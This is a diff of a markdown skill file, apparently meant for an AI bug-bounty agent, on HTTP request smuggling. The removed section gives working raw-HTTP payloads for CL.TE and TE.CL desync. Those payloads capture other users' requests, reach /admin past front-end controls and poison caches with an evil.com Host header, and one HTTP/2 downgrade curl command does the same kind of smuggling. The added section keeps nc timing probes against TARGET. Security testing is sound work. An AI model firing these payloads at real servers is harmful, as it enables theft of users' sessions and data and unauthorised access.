@@ -1,14 +1,15 @@
 ---
 name: attack-request-smuggling
-description: "HTTP request smuggling — CL.TE, TE.CL, TE.TE desync attacks for cache poisoning and auth bypass"
+description: "HTTP request smuggling router — detect desync first, then load the variant sub-skill (CL.TE / TE.CL / TE.TE-obfuscation / H2-and-client-side)"
 category: "web-application"
-version: "1.0"
+version: "2.0"
 author: "bountyreper-official"
 tags:
   - request-smuggling
   - http-desync
-  - web
-  - attack
+  - cl-te
+  - te-cl
+  - h2c
 tech_stack:
   - web
 cwe_ids:
@@ -23,142 +24,40 @@ severity_boost:
 
 # HTTP Request Smuggling
 
-## Objective
+## Route first — load the variant sub-skill
 
-Exploit disagreements between front-end and back-end servers on request boundary parsing (Content-Length vs Transfer-Encoding) to smuggle a second request.
+Smuggling splits by WHERE the parser disagreement is. Detect desync first (timing
+probe below), then load the matching sub-skill for the exploit stage:
 
-## Testing Methodology
+| Disagreement | Variant | Load |
+|---|---|---|
+| Front reads Content-Length, back reads Transfer-Encoding | CL.TE | `skill(action="load", name="attack-smuggling-cl-te")` |
+| Front reads Transfer-Encoding, back reads Content-Length | TE.CL | `skill(action="load", name="attack-smuggling-te-cl")` |
+| Both parse TE but disagree on obfuscated forms | TE.TE | `skill(action="load", name="attack-smuggling-te-te")` |
+| HTTP/2 → HTTP/1 downgrades, or browser-triggered desync | H2 / client-side | `skill(action="load", name="attack-smuggling-h2")` |
 
-### Phase 1: Detect Smuggling
-
-**CL.TE (front uses Content-Length, back uses Transfer-Encoding):**
-
-```http
-POST / HTTP/1.1
-Host: TARGET
-Content-Length: 13
-Transfer-Encoding: chunked
-
-0
-
-SMUGGLED
-```
-
-**TE.CL (front uses Transfer-Encoding, back uses Content-Length):**
-
-```http
-POST / HTTP/1.1
-Host: TARGET
-Content-Length: 3
-Transfer-Encoding: chunked
-
-8
-SMUGGLED
-0
-
-```
-
-### Phase 2: Timing-Based Detection
-
-Send ambiguous request, measure response time:
-- If back-end times out waiting for more data → smuggling may be possible
+## Detect desync first (one timing probe each)
 
 ```bash
-# CL.TE detection (timeout = vulnerable)
-printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\nX' | timeout 10 nc TARGET 80
+# CL.TE detector: 5s hang = back-end waiting for more body = front used CL
+printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\nX' \
+  | timeout 10 nc TARGET 80
+
+# TE.CL detector: hang = front waits (using TE), back consumed early
+printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n' \
+  | timeout 10 nc TARGET 80
 ```
 
-### Phase 3: Confirm Smuggling
+Timing alone is not proof — each sub-skill has the confirmation + exploit steps.
+Sub-skill files: `cl-te`, `te-cl`, `te-te`, `h2` (under `attack-request-smuggling/`).
 
-**CL.TE confirmed:**
+## Proof requirements (all variants)
 
-```http
-POST / HTTP/1.1
-Host: TARGET
-Content-Length: 35
-Transfer-Encoding: chunked
+- Differential behavior between two observers (front vs back response split)
+- The smuggled request's EFFECT visible (captured response, cache change, auth state)
+- HTTP/1.1 evidence — HTTP/2 claims need H2-specific framing, not text probes
 
-0
+## Notes
 
-GET /404-proof HTTP/1.1
-X: x
-```
-
-If next request to `/` returns 404 or different page, smuggling is confirmed.
-
-### Phase 4: Exploitation
-
-**Capture other user's request:**
-```http
-POST / HTTP/1.1
-Host: TARGET
-Content-Length: 100
-Transfer-Encoding: chunked
-
-0
-
-POST /log HTTP/1.1
-Content-Length: 10000
-Content-Type: application/x-www-form-urlencoded
-
-data=
-```
-Next user's request is appended to `data=` parameter.
-
-**Bypass front-end access controls:**
-```http
-POST / HTTP/1.1
-Host: TARGET
-Content-Length: 50
-Transfer-Encoding: chunked
-
-0
-
-GET /admin HTTP/1.1
-Host: TARGET
-X: x
-```
-
-**Cache poisoning via smuggling:**
-```http
-POST / HTTP/1.1
-Host: TARGET
-Content-Length: 100
-Transfer-Encoding: chunked
-
-0
-
-GET /static/main.js HTTP/1.1
-Host: evil.com
-X: x
-```
-
-### Phase 5: H2.CL / H2 Smuggling
-
-```bash
-# HTTP/2 downgrade smuggling
-curl --http2 https://TARGET/ \
-  -H "Content-Length: 0" \
-  -H "Transfer-Encoding: chunked" \
-  -d "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: TARGET\r\n\r\n"
-```
-
-## What Constitutes a Finding
-
-| Finding | Severity |
-|---------|----------|
-| Request smuggling → capture user requests | Critical (P1) |
-| Smuggling → admin access bypass | Critical (P1) |
-| Smuggling → cache poisoning | Critical (P1) |
-| CL.TE or TE.CL desync confirmed | High (P2) |
-
-## Evidence Requirements
-
-- Smuggling variant (CL.TE, TE.CL, TE.TE, H2.CL)
-- Proof of desync (wrong response, timing, captured request)
-- Impact demonstration (auth bypass, cache poison, request capture)
-
-## References
-
-- [PortSwigger: Request Smuggling](https://portswigger.net/web-security/request-smuggling)
-- [James Kettle: HTTP Desync Attacks](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
+- Modern stacks: test HTTP/2 routes before raw nc probes — many edge proxies disable
+  ambiguous HTTP/1.1 downgrades (see h2 sub-skill first when target advertises h2)
